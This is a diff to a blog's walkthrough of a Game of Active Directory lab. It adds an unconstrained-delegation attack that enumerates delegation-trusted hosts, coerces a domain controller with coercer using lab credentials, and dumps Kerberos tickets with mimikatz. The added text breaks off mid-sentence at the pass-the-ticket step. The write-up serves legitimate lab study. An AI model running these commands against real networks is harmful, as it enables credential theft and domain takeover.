@@ -140,7 +140,7 @@
 
   <div>
         <div class="toc col-lg-3 hidden-xs hidden-sm">
-            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
+            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#credentials-dumping" title="Credentials Dumping">Credentials Dumping</a></li><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#shares-enumeration" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a></li><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#silver-ticket_1" title="Silver Ticket">Silver Ticket</a></li></ul></div>
         </div>
     <h2 id="status">Status</h2>
 <p>Recovered Passwords:</p>
@@ -884,7 +884,26 @@ lsadump::dcsync /user:arya.stark
 <p><img alt="north-asproasting-cracking.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/north-asproasting-cracking.png"/></p>
 <p>User <code>NORTH\brandon.stark</code>'s password is <code>iseedeadpeople</code>.</p>
 <h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
-<p>TODO</p>
+<p>Enumerate vulnerable computers:</p>
+<div class="highlight"><pre><span></span><code>Get-ADComputer<span class="w"> </span>-Filter<span class="w"> </span><span class="o">{</span>TrustedForDelegation<span class="w"> </span>-eq<span class="w"> </span><span class="nv">$True</span><span class="o">}</span>
+</code></pre></div>
+<p><img alt="Pasted image 20250212214432.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212214432.png"/></p>
+<p>Since winterfell is vulnerable and the attacker has control on this server, it's possible to complete the attack; the next step is to force another computer (the parent domain controller - kingslanding) to authenticate against the vulnerable host.</p>
+<p>Check if kingslanding can be forced to connect to winterfell:</p>
+<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>scan<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--target-ip<span class="w"> </span><span class="m">10</span>.1.0.10
+</code></pre></div>
+<p><img alt="Pasted image 20250212213811.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212213811.png"/></p>
+<p>Force kingslanding to connect to winterfell:</p>
+<div class="highlight"><pre><span></span><code>coercer<span class="w"> </span>coerce<span class="w"> </span>-u<span class="w"> </span>robb.stark<span class="w"> </span>-p<span class="w"> </span>sexywolfy<span class="w"> </span>--target-ip<span class="w"> </span><span class="m">10</span>.1.0.10<span class="w"> </span>--listener-ip<span class="w"> </span><span class="m">10</span>.1.0.11
+</code></pre></div>
+<p><img alt="Pasted image 20250212213934.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212213934.png"/></p>
+<p>On winterfell, dump tickets from memory with <code>mimikatz</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span><span class="w"> </span><span class="o">/</span><span class="k">export</span>
+</code></pre></div>
+<p><img alt="Pasted image 20250212213745.png" src="https://ojack69.github.io/jacks-corner/Pasted image 20250212213745.png"/></p>
+<p>Perform a pass-the-ticket attack with </p>
+<h2 id="constrained-delegation">Constrained Delegation</h2>
 <h2 id="golden-ticket">Golden Ticket</h2>
 <h3 id="child-domain-to-parent">Child domain to parent</h3>
 <p>Dump NTLM hashes and Kerberos keys:</p>
